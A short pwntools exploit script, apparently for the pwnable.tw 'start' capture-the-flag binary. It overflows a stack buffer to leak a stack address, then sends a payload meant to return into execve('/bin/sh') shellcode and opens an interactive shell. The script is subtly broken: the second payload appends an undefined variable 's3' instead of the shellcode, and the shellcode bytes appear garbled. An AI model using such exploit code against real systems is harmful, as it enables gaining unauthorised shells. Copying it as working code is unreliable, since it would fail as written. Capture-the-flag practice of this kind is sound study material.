#! /usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#p = remote("chall.pwnable.tw", 10000)
shellcode = b"j\x0bXj\x00hn/shh//bi1\xc9\x99T[\xcd\x80"
addr_ecx = 0x08048087
p = process("./start")
#gdb.attach(p, 'b _start')
p.recv()
payload = b"A"*(0x14)
payload += p32(addr_ecx)
p.send(payload)
x = p.recv()
#print(hex(u32(x[0:4])))
#print(hex(u32(x[4:8])))
#print(hex(u32(x[8:12])))
addr_stack = u32(x[0:4]) + 0x14
p2 = b"A"*(0x14)
p2 += p32(addr_stack)
p2 += s3
p.send(p2)

p.interactive()
